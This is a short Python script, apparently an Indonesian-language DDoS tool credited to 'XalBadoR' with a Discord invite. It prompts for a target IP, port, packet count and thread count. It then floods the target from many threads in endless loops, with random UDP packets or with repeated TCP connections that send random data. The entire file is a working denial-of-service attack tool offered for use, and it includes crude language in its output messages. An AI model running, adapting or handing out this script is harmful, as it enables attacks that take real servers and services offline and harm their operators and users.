#!/usr/bin/env python3
#Semoga yang curi script yatim
#Ddos by XalBadoR
#Join My T3Am : https://discord.gg/fRDAvXsU
import random
import socket
import threading
import os

os.system("clear")
print("Tools by Xalbador")
print("Mau Pake? Nonton Pekob Dulu")
print("Jangan Abuse ")
ip = str(input(" LevrinceDDOS | Ip:"))
port = int(input(" LevrinceDDOS | Port:"))
choice = str(input(" LevrinceDDOS | Gas Gak Ni?(y/n):"))
times = int(input(" LevrinceDDOS | Packets:"))
threads = int(input(" LevrinceDDOS | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | LevrinceX |")
		except:
			print("[!] | EJET SERVER DOWN |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Levrince Nih Bos")
		except:
			s.close()
			print("[*] Down lagi kontol")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
